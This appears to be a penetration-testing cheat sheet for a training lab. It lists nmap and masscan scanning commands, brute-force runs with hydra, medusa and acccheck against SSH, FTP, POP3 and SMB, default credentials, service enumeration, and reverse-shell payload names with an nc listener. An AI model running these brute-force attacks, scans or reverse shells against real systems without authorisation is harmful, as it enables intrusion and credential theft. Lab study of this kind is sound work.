## automate VPN
creating txt file to automate vpn authentication
```sh
tar xvzf file.tar.gz  
echo 'OS-#####' > cred.txt  
echo ' #######' >> cred.txt  
vi auth-user-pass cred.txt  
openvpn OS-####-PWK.ovpn 
```

## Default Nmap Scanning<br />
```sh
nmap -sU -sV -n --top-ports 200 192.168.1.30  > /root/PWK-Lab/192.168.1.30/nmap-udp<br />
nmap -sT -sV -A -O -v -p 1-65535 192.168.1.30 > /root/PWK-Lab/192.168.1.30/nmap-tcp<br />
```
-sS stealth scanning<br />
```sh
nmap -vv -Pn -A -sC -sS -T 4 -p- 10.x.x.x<br />
nmap -p- -sS -A 10.x.x.x<br />
```
Vulnerability Scanning :  ``` nmap -sS -sV --script=vulscan/vulscan.nse 10.x.x.x ```<br />
OS detection :  ``` nmap -O -v 10.x.x.x ```<br /><br />

Automated scanning tools<br />
[Reconnoitre : ](https://github.com/codingo/Reconnoitre)
```python /root/Recon/Reconnoitre/reconnoitre.py -t 10.x.x.x -o /root/PWK-Lab/10.x.x.x/ --services``` <br />
[OneTwoPunch : ](https://github.com/superkojiman/onetwopunch)
```vi targets.txt; onetwopunch.sh -t targets.txt -p all -n "-sV -O --version-intensity=9" ```<br />

unicornscan -i tap0 -I -mT 10.x.x.x:a <br />
masscan -p0-65535 10.x.x.x --rate 150000 -oL output.txt <br />

## Scanning per protocols...
## - **SSH(22)** <br />
Bruteforce : <br />
```sh
nmap -p 22 --script ssh-brute --script-args userdb=users.txt,passdb=users.txt --script-args ssh-brute.timeout=4s 10.x.x.x 
hydra -l user -P /usr/share/wordlists/rockyou.txt  10.x.x.x ssh -t 4
```
ref : https://github.com/g0tmi1k/debian-ssh  && https://blog.g0tmi1k.com/2010/04/pwnos/ <br />
OpenF*** (Apache mod_ssl < 2.8.7 OpenSSL) 764.c <br />

## - **FTP(21)** <br />
Default cred : anonymous/anonymous | ftp/ftp | ftpuser|ftpuser<br />

```sh
nmap -sV -Pn -vv -p 21  --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221 10.x.x.x
nmap --script=ftp-anon,ftp-bounce,ftp-libopie,ftp-proftpd-backdoor,ftp-vsftpd-backdoor,ftp-vuln-cve2010-4221,tftp-enum -p 21 10.x.x.x
check windows OS files : https://www.quora.com/How-can-I-tell-what-version-of-Windows-is-installed-on-a-hard-drive-without-booting-it 
```
Bruteforce : <br />
```sh
medusa -h 10.x.x.x -u user -P /root/SecLists/Passwords/bt4-password.txt -M ftp 
./root/PWK-Lab/FTP/ftp-user-enum-1.0/ftp-user-enum.pl -U /root/PWK-Lab/fuzzdb/bruteforce/names/simple-users.txt -t 10.x.x.x" 
```

## - **SMTP(25)**<br />
**vulnerability check** <br />
```sh 
nmap --script smtp-commands,smtp-enum-users,smtp-vuln-cve2010-4344,smtp-vuln-cve2011-1720,smtp-vuln-cve2011-1764 -p 25 10.x.x.x 
```
**enumerating users** <br />
```sh 
nmap --script smtp-enum-users.nse 10.x.x.x

smtp-user-enum -M VRFY -U users.txt -t 10.x.x.x
smtp-user-enum -M VRFY -U /usr/share/metasploit-framework/data/wordlists/unix_users.txt -t 10.x.x.x
smtp-user-enum -M VRFY -U  /usr/share/seclists/Usernames/Names/names.txt -t 10.x.x.x
```
connecting to mailsvr: <br />
```sh 
telnet IPADDRESS 25
nc -nvv IPADDRESS 25
```
msf module : auxiliary/scanner/smtp/smtp_enum<br />

## -  **POP3(110)**<br />
**Bruteforce** : ```hydra -L usr.txt -P /usr/share/wordlists/fasttrack.txt -t20 10.x.x.x -s55007 -I pop3```<br />

POP3 command
```sh 
USER boris
PASS *****
LIST 
RETR 1 
```

## -  **SNMP(161)**<br />
**Default Community Strings** : public/private/manager<br />

```sh 
snmp-check -t [IP] -c public 
snmpwalk -c public -v1 10.0.0.0 
nmap -sU --open -p 161 10.11.1.0/24 -oG mega-snmp.txt 
sudo nmap -sU -p 161 --script default,snmp-sysdescr 10.11.1.0/24 
onesixtyone -c community -i ips 
```
cf. for ip in $(seq 1 254); do echo 10.11.1.$ip; done > ips<br />
```sh 
nmap 10.11.1.* -p161 --open -oG - | awk '/161\/open/{print $2}' 
```

 
## -  **SMB(139,445)**<br />
Checking SMB port open/running : 
```sh 
nmap -A -p 139,445 10.11.1.1-254 -oG smb_service.txt; grep Up smb_service.txt | cut -d "" "" -f 2  
nmap 10.11.1.* -p139,445 --open -oG - | awk '/139\/open.*445\/open/{print $2}'  
```
**vulnerability scanning** : ```nmap -p 139,135,445 -vv --script=smb-vuln-cve2009-3103.nse,smb-vuln-ms06-025.nse,smb-vuln-ms07-029.nse,smb-vuln-ms08-067.nse,smb-vuln-ms10-054.nse,smb-vuln-ms10-061.nse,smb-vuln-ms17-010.nse 10.x.x.x```

**enumerating users** : ```nmap --script smb-enum-users.nse -p445 10.x.x.x  ```
```nmap -sU -sS --script smb-enum-users.nse -p U:137,T:139 10.x.x.x  ```


**smbclient**<br />
```sh 
smbclient -L //10.x.x.x/share -U user 
smbclient //10.x.x.x//IPC$ -N  
```
**checking access** <br />
```sh 
acccheck -v -t 10.x.x.x  -u user -P /usr/share/dirb/wordlists/common.txt  
acccheck -v -t 10.x.x.x -U /root/Vulnhub/Stapler/user.txt  -P /usr/share/dirb/wordlists/common.txt  
```
**smbmap**<br />
```sh 
smbmap -u user -p user -d share -H 10.x.x.x  
smbmap -u user -p .bash_history -d share -H 10.x.x.x  
smbmap -H 10.x.x.x\share -u user -p '.bash_history' -L  
```
ref : https://hackercool.com/2016/07/smb-enumeration-with-kali-linux-enum4linuxacccheck-smbmap/<br />


## MISC

- metasploit issue : <br />
sudo apt-get update <br />
service postgresql restart <br />
msfdb reinit  <br />
cf : https://github.com/rapid7/metasploit-framework/issues/9556 <br />


## Windows Shell
```sh 
//Non-Staged :  (windows/shell_reverse_tcp) && nc -nlvp 443
//Staged : (windows/shell/reverse_tcp) && use exploit/multi/handler
```

